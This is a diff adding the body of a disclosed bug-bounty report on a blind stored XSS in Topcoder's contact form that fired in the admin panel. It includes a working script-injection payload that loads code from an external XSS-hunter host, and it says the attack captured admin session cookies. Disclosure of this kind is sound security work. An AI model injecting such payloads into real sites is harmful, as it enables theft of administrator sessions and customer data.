@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Cross-site Scripting (XSS) - Stored"
 enriched: true
+body: true
 date: 2020-08-07
 submitted: 2020-05-19T15:40:22.675Z
 bounty_usd: null
@@ -25,6 +26,36 @@ title: "Blind stored XSS due to insecure contact form at https://www.topcoder.co
 - Report: [https://hackerone.com/reports/878145](https://hackerone.com/reports/878145)
 - CWE: Cross-site Scripting (XSS) - Stored
 - Submitted: 2020-05-19T15:40:22.675Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+## Summary:
+I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://www.topcoder.com/contact-us/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets.  I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.
+
+## Steps To Reproduce:
+[add details for how we can reproduce the issue]
+
+1.	Browse to the page at https://www.topcoder.com/contact-us/ and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field. 
+2.	Submit the form and have and admin access the information.
+3.	This will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event. 
+
+## Supporting Material/References:
+[list any additional material (e.g. screenshots, logs, etc.)]
+
+  * [attachment / reference]
+
+F834746  XSS hunter screenshot revealing mail chimp information
+
+█████ Dom.html you can search through this for my XSS hunter payload `"><script src=https://xvt.xss.ht></script>`
+
+F834748 Full XSS hunter email report
+
+## Impact
+
+An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.
+An attacker can exploit the above cookies to access the admin panel.
 
 ## Timeline
 
